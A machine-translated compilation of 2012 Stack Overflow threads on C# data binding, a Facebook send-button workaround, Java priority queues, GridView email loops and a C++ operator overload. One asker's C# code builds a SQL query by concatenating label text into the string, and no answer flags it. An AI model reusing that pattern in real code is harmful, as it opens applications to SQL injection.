            lbloprange.Text = dt1.Rows[0]["OriginalPriceRange"].ToString();
            lbloprange.Visible = true;
            lbloriprice.Visible = false;
        }

        Label lblsaleprice = e.Item.FindControl("saleprice") as Label;
        if (dt1.Rows[0]["SalePrice"].ToString() == "" || dt1.Rows[0]["SalePrice"].ToString() == "0.00")
        {
            lblsaleprice.Attributes.Add("style", "display:none");
        }
        else if (dt1.Rows[0]["SalePriceRange"].ToString() != "")
        {
            lblsaleprice.Text = "Special <br />" + dt1.Rows[0]["SalePriceRange"].ToString();
        }
        else
        {
            strSP = Convert.ToDecimal(dt1.Rows[0]["SalePrice"].ToString());
            lblsaleprice.Text = "Special <br />" + strSP.ToString("c");
        }

    }

    #endregion 
```

它在 ad1.fill(dt1) 上抛出错误

我重新设计了我的代码，想知道这是否会减少或消除错误。请指教

```
 #region repeater item databound
    protected void rProducts_OnItemDataBound(object source, RepeaterItemEventArgs e)
    {

        // displaying sale and original price //
        Label lblitemid = e.Item.FindControl("itemID") as Label;

        SqlDataSource SqlDataSource2 = new SqlDataSource();
        SqlDataSource2.ID = "SqlDataSource2";
        SqlDataSource2.ConnectionString = ConfigurationManager.ConnectionStrings["DBconnection"].ConnectionString;
        SqlDataSource2.SelectCommand = "select SaleItemNo, OriginalPrice, SalePrice, OriginalPriceRange, SalePriceRange from SaleItems where CatalogItemId='" + lblitemid.Text + "'";

        Repeater rep = e.Item.FindControl("rpt2") as Repeater;
        rep.DataSource = SqlDataSource2;
        rep.DataBind();

     }
#endregion 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T02:27:08.503

你`SqlCommand`的`SqlConnection`, 和`SqlDataAdapter`都需要在`using`块中。您的连接可能真的用完了，因为您没有及时关闭它们。

* * *

块示例`using`：

```
using (SqlConnection myconnection1 = new SqlConnection(ConfigurationManager.ConnectionStrings["DBconnection"].ConnectionString))
{
    using (SqlCommand sqlCmd1 = new SqlCommand(salequery, myconnection1))
    {
        using (SqlDataAdapter ad1 = new SqlDataAdapter(sqlCmd1))
        {
            dt1 = new DataTable();
            ad1.Fill(dt1);
        }
    }
} 
```

# facebook - 如何使用 Facebook 发送按钮将 Facebook 页面作为 url 发送？

> ID：13076984
> 
> 赞同：2
> 
> 时间：2012-10-25T20:47:03.940
> 
> 标签：facebook, button, facebook-opengraph, send, facebook-page

我将尝试解释一下我的问题的背景。

**语境：**

不久前，我开始研究 Facebook 应用程序。要求之一是作为选项卡包含在 Facebook 页面中。此应用程序将在页面上包含一个发送按钮，以便能够使其与特定人员更具互动性，应用程序的用户将自行选择。这背后的原因是因为包含该应用程序的 Facebook 页面与酒精有关，“喜欢”该应用程序将获得更多的试听和潜在的孩子。使用发送按钮而不是 Facebook 的其他类似选项（如发送对话框等）的另一个原因是因为在 Facebook 文档中声明发送按钮适用于移动设备，而其他选项则不适用。

**问题：**

我的问题与发送按钮有关。我需要的是能够完全配置发送按钮：url、图片、标题、描述。为了能够做到这一点，我研究了开放图形标签。如果我想与消息一起发送的页面是 Facebook 之外的网站，那么一切正常。一旦我开始使用 Facebook 页面的 url（我们称之为 www.facebook.com/mycustompage），爬虫就会从 facebook.com 获取图像、标题、描述，而忽略实际页面，并且生成的消息不是我的想。

我进行了很多搜索以更好地了解此限制，但找不到任何相关内容。我能找到的唯一可能的解决方案是（即使是这个我也很难找到）： [发送按钮返回错误代码，就像按钮工作正常](https://stackoverflow.com/questions/8714890/send-button-returning-error-codes-like-button-works-fine)

上面的讨论是我已经实施的解决方法，但不是 100% 我想要的。所描述的解决方法是关于放入发送按钮：

```
 <div class="fb-send" data-href="http://www.mycustomdomain.com/og"></div> 
```

嗅探用户代理的页面。如果用户代理是 Facebook 爬虫，仅使用打开的图形标签提供 html 空页面，否则重定向到所需的 URL - 在我们的例子中是 facebook 页面 www.facebook.com/mycustompage。

产生的消息包含：

*   标题是指向 www.mycustomdomain.com/og 的链接，单击该链接会在新选项卡中打开一个页面，地址为 www.facebook.com/mycustompage - 这还可以
*   在标题下，我有一个包含链接域的“子标题”只读文本：www.mycustomdomain.com - 这不行，因为我不想分享我托管应用程序的位置。
*   图像和所需的描述 - 这没关系。

**结论：**

1.  我想知道是否有更好的方法来做到这一点而不是这种解决方法。
2.  如果不是，我想知道如何为生成的消息隐藏“副标题”，以使托管域不可见。

# java - 您将如何遍历名称略有不同的队列？

> ID：13076990
> 
> 赞同：0
> 
> 时间：2012-10-25T20:47:17.740
> 
> 标签：java, for-loop

首先，这是我的一个课程中一项庞大的编程任务的一小部分。

我有 10 个不同的优先级队列。像prio1，prio2，prio3。这些队列中的每一个都按进程号排序。

如果我想检查优先级为 3 的进程#16 是否需要用更高优先级的进程替换，最简单的方法是什么？

```
private static void checkHigherQueues( int runningPrio, int runningPid, int cpu ){
   for( int i = 1; i < 11; i++){
       if ( prio(i).peek() == null ){
       }else if( prio(i).peek() < runningPid && i == runningPrio){
           release from cpu....
       } 
```

回答一些问题：

我为每个优先级使用不同的队列，因为我不知道您可以使用两个比较器进行优先级队列排序。这是我用于队列的代码，如何将其更改为先按优先级排序，然后按 pid 排序？

```
prio1 = new PriorityQueue<>(1, new Comparator<String>() {
            @Override
            public int compare( String x, String y ){
                int first = Integer.parseInt(x);
                int second = Integer.parseInt(y);
                return second - first;
            }
        }); 
```

# asp.net - 从 GridView 发送重复的电子邮件

> ID：13076996
> 
> 赞同：1
> 
> 时间：2012-10-25T20:47:24.230
> 
> 标签：asp.net, webforms

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T20:52:18.097

Try creating a new MailMessage after you check the checkbox, what you're doing now is reusing the same message for each iteration and adding a new mail address without clearing the previous ones.

```
protected void btnSendEmail_Click(object sender, EventArgs e)
{

    foreach (GridViewRow gr in GridView1.Rows)
    {
        CheckBox cb = (CheckBox)gr.FindControl("chkItem");
        if (cb.Checked)
        {
            MailMessage mailMessage = new MailMessage();
            mailMessage.To.Add(new MailAddress(GridView1.DataKeys[gr.RowIndex]["Assigned_To"].ToString()));
            mailMessage.From = new System.Net.Mail.MailAddress(System.Configuration.ConfigurationManager.AppSettings["fromEmailAddress"]);
            mailMessage.Priority = System.Net.Mail.MailPriority.High;
            //Text/HTML
            mailMessage.IsBodyHtml = false;
            string mySubURI = HttpContext.Current.Request.Url.AbsoluteUri.ToString().Replace("Test.aspx", "ABC.aspx");
            mySubURI += String.Format("&ID={0}", gr.Cells[0].Text);
            mailMessage.Body = "this is just test... " + " " + Environment.NewLine + mySubURI;
            mailMessage.Subject = "Test";

            System.Net.Mail.SmtpClient smtpClient = new System.Net.Mail.SmtpClient();
            try
            {
                smtpClient.Send(mailMessage);

                //Response.Write("<B>Email Has been sent successfully.</B>");
            }
            catch (Exception ex)
            {
                Response.Write(ex.Message);
            }

        }
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T20:53:48.717

I think your problem is this: you're creating the mail message once, but re-using it for every row. So for every grid row you add a new To entry ... but you've still got the old ones!

# c++ - 运算符不匹配 == 错误，C++

> ID：13076997
> 
> 赞同：2
> 
> 时间：2012-10-25T20:47:25.580
> 
> 标签：c++, operator-overloading

这真的让我很烦。我正在重载 C++ 中的比较运算符，但我遇到了一个奇怪的错误，我不确定如何更正。

我正在使用的代码如下所示：

```
bool HugeInt::operator==(const HugeInt& h) const{
    return h.integer == this->integer;
}

bool HugeInt::operator!=(const HugeInt& h) const{
    return !(this == h);
} 
```

哪里`integer`是`short [30]`

`==`重载工作正常。但是当我尝试在`!=`正文中使用它时，它告诉我`==`尚未定义。我是 C++ 新手，所以欢迎任何提示。

谢谢！

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-10-25T20:48:55.060

您正在尝试比较指针和实例。`this`是指向当前对象的指针，您需要先取消引用它。

无论如何，你已经提到这`integer`是一系列短裤。这可能意味着您不应该将其与`==`- 您应该手动比较所有元素（当然，在检查数组中的元素数量是否相同之后，以防它们可以部分填充）。或者你可以使用`vector`Luchian 建议的 - 它有一个明确定义的`operator==`.

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-10-25T20:49:18.240

像这样（缺少星号）。

```
bool HugeInt::operator!=(const HugeInt& h) const{
    return !(*this == h);
} 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-10-25T20:49:00.877

`this`有 type `HugeInt*`，但你使用它就好像它是`HugeInt&`.

改为使用`return !(*this == h);`:)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-10-25T20:49:30.913

```
bool HugeInt::operator!=(const HugeInt& h) const{
    return !(this == h);
} 
```

应该

```
bool HugeInt::operator!=(const HugeInt& h) const{
    return !(*this == h);
} 
```

此外，如果`integer`是 type `short[30]`，则比较不会达到您的预期。如果这是您想要的，您需要逐个元素进行比较。

另外，我可以建议使用 a`std::vector<short>`而不是原始数组吗？

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-10-25T20:52:05.897

重载的运算符作用于对象而不是指针（像这样）。您应该在不等式运算符中取消引用它：

```
return !(*this == h); 
```

您也可以像这样构造它：

```
return( !operator==( h ) ); 
```